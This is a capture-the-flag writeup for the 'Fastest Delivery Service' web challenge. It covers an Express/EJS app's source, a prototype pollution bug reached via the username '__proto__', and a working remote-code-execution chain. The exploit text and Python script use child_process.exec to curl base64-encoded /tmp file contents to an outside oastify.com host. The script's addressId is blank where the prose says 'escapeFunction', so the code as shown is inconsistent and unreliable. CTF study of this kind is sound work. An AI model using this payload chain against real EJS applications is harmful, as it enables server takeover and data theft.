
## Fastest Delivery Service Writeup

- **Category:** Web
- **Points:** 270
- **Difficulty:** Hard

## Challenge Description

No time for description, I had some orders to deliver : D 
Note: The code provided is without jailing, please note that when writing exploits.

## Challenge Code

```js
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const crypto = require("crypto");

const app = express();
const PORT = 3000;

// In-memory data storage
let users = {};
let orders = {};
let addresses = {};

// Inserting admin user
users['admin'] = { password: crypto.randomBytes(16).toString('hex'), orders: [], address: '' };

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.set('view engine', 'ejs');
app.use(session({
    secret: crypto.randomBytes(16).toString('hex'),
    resave: false,
    saveUninitialized: true
}));

// Routes
app.get('/', (req, res) => {
    res.render('index', { user: req.session.user });
});
app.get('/login', (req, res) => {
    res.render('login');
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const user = users[username];

    if (user && user.password === password) {
        req.session.user = { username };
        res.redirect('/');
    } else {
        res.send('Invalid credentials. <a href="/login">Try again</a>.');
    }
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

app.get('/register', (req, res) => {
    res.render('register');
});

app.post('/register', (req, res) => {
    const { username, password } = req.body;

    if (Object.prototype.hasOwnProperty.call(users, username)) {
        res.send('Username already exists. <a href="/register">Try a different username</a>.');
    } else {
        users[username] = { password, orders: [], address: '' };
        req.session.user = { username };
        res.redirect(`/address`);
    }
});

app.get('/address', (req, res) => {
    const { user } = req.session;
    if (user && users[user.username]) {
        res.render('address', { username: user.username });
    } else {
        res.redirect('/register');
    }
});

app.post('/address', (req, res) => {
    const { user } = req.session;
    const { addressId, Fulladdress } = req.body;

    if (user && users[user.username]) {
        addresses[user.username][addressId] = Fulladdress;
        users[user.username].address = addressId;
        res.redirect('/login');
    } else {
        res.redirect('/register');
    }
});



app.get('/order', (req, res) => {
    if (req.session.user) {
        res.render('order');
    } else {
        res.redirect('/login');
    }
});

app.post('/order', (req, res) => {
    if (req.session.user) {
        const { item, quantity } = req.body;
        const orderId = `order-${Date.now()}`;
        orders[orderId] = { item, quantity, username: req.session.user.username };
        users[req.session.user.username].orders.push(orderId);
        res.redirect('/');
    } else {
        res.redirect('/login');
    }
});

app.get('/admin', (req, res) => {
    if (req.session.user && req.session.user.username === 'admin') {
        const allOrders = Object.keys(orders).map(orderId => ({
            ...orders[orderId],
            orderId
        }));
        res.render('admin', { orders: allOrders });
    } else {
        res.redirect('/');
    }
});


// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
```

## Analysis

After analyzing the code, I found that the flag is stored on the server in `/tmp/flag_{random_string}.txt` (according to the Dockerfile). Therefore, we need to get Remote Code Execution (RCE) to retrieve the flag. Upon further examination, I discovered a Server-Side Prototype Pollution vulnerability in the address addition function:
```js
app.post('/address', (req, res) => {
    const { user } = req.session;
    const { addressId, Fulladdress } = req.body;

    if (user && users[user.username]) {
        addresses[user.username][addressId] = Fulladdress;
        users[user.username].address = addressId;
        res.redirect('/login');
    } else {
        res.redirect('/register');
    }
});
```

Here, `addresses[user.username][addressId] = Fulladdress;` accepts two parameters from the request: addressId and Fulladdress. To exploit this Server-Side Prototype Pollution (SSPP), we need to control the user.username from the session. Since the application uses the ejs engine, we can achieve RCE if we can control `user.username`.

## Exploitation

I found that I can control user.username by registering a new user with the username `__proto__`. We can then add an address with addressId: `escapeFunction` and Fulladdress: `JSON.stringify; process.mainModule.require('child_process').exec('curl "http://id_here.oastify.com/$(cat /tmp/*.txt | base64 -w 0)"')`.

Next, add another new address with addressId: `client` and Fulladdress: `true`.

Finally, access the index `http://id_here.playat.flagyard.com/` or any page, and notice that the command has been executed, allowing us to retrieve the flag via Burp Collaborator.

Due to server restrictions that revoke sessions in less than 3 seconds, the exploit is automated using a script that registers a new user, logs in, and exploits the SSPP.

## Exploitation Script

```python
import requests

base_url = "http://ad8a40dc28e9f70f83bf8.playat.flagyard.com"
register_url = f"{base_url}/register"
address_url = f"{base_url}/address"

register_data = {
    "username": "__proto__",
    "password": "12345"
}

address_data1 = {
    "addressId": "  ",
    "Fulladdress": "JSON.stringify; process.mainModule.require('child_process').exec('curl \"http://id_here.oastify.com/$(cat /tmp/*.txt | base64 -w 0)\"')"
}

address_data2 = {
    "addressId": "client",
    "Fulladdress": "true"
}

sess = requests.Session()
register_response = sess.post(register_url, data=register_data)
print(f"Registration response: {register_response.status_code}")

address_response = sess.post(address_url, data=address_data1)
print(f"address_response 1 response: {address_response.status_code}")

address_response = sess.post(address_url, data=address_data2)
print(f"address_response 2 response: {address_response.status_code}")

sess.get(base_url)
```

## Flag

BHFlagY{76076bd96da5a2e24bd52ea1be660fe4}
